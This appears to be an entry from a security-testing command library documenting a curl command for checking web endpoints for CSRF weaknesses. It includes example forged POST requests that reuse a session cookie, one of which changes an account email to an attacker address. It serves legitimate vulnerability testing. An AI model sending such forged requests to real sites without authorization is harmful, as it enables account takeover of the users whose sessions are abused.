---
id: d4e5f6g7-h8i9-0123-defg-456789012345
data: curl -X POST $URL -d $DATA -b "$COOKIE"
tags:
  - web-testing
  - csrf
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T12:00:00Z'
updated_at: '2025-12-14T17:27:15.815Z'
verified: false
validated: true
submitted: true
---
# curl-test-csrf

## Command

```bash
curl -X POST $URL -d $DATA -b "$COOKIE"
```

## Description

This command uses curl to send a forged POST request to a web endpoint without CSRF tokens, testing for vulnerability by simulating an attacker's request with a victim's session cookie.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `$URL` | Target endpoint URL (e.g., http://localize.example.com/pages/create_project) | Yes |
| `-d $DATA` | POST data payload (e.g., project_name=test) | Yes |
| `-b "$COOKIE"` | Session cookie for authentication (e.g., session=abc123) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://localize.example.com/pages/create_project -d "project_name=test_project" -b "session=authenticated_session"
```

### Advanced Usage

```bash
curl -X POST http://localize.example.com/pages/settings -d "email=attacker@example.com&other_setting=value" -b "session=authenticated_session" -v
```

## Expected Output

Successful response: HTTP 200 OK or 302 Found, with body indicating action completed (e.g., "Project created successfully"). Failure with token error confirms protection.

## Related

- [[Related Procedure: Identify-CSRF-Vulnerable-Endpoints-in-Web-Application]]
